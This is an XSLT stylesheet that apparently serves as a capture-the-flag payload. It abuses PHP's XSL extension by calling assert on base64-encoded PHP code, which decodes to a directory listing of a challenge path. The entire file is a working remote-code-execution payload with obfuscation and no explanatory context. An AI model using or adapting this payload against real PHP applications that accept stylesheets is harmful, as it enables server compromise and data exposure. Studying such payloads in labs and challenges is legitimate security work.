<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  
  <xsl:template match="/">
    <html>
      <body>
        <xsl:variable name="eval">
          eval(base64_decode("dmFyX2R1bXAoc2NhbmRpcigiL2NoYWxsZW5nZS93ZWItc2VydmV1ci9jaDUwLyIpKTsK"))
        </xsl:variable>
        <xsl:value-of select="php:function('assert', $eval)" />
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
